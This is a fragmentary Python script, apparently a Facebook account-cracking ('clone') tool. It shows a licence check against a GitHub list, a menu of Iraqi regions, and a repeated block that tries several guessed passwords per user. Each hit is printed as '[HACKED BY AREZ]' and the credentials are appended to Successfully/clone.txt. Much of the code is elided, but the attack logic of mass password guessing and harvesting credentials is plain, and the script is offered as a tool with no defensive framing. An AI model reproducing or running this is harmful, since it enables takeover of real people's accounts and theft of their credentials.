...
def chk():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/4REZ/Darkshow/main/Active.txt").text
    if id in httpCaht:
      ...
      print("\x1b[91mYOUR ID IS NOT ACTIVE.........")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
\033[1;91mTekegram Chenall ArezBashdar
\033[1;98m         :)Arez:(
--------------------------------------
...
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m[1]\x1b[1;91m  IRAQ'
    print '\x1b[1;97m[2]\x1b[1;91m  ERBIL'
    print '\x1b[1;97m[3]\x1b[1;91m  SLEMANI'
    print '\x1b[1;97m[4]\x1b[1;91m  KERKUK'
    print '\n\x1b[1;97m[0]  Exit            '
    print '\x1b[1;97m---------------------------------------------------------\n'
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY AREZ]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED BY AREZ]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
                    okb = open('Successfully/clone.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED BY AREZ]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('Successfully/clone.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED BY AREZ]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('Successfully/clone.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BY AREZ]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('Successfully/clone.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BY AREZ]  ' + k + c + user + '  \x1b[1;92m|  ' + pass6
                                okb = open('Successfully/clone.txt', 'a')
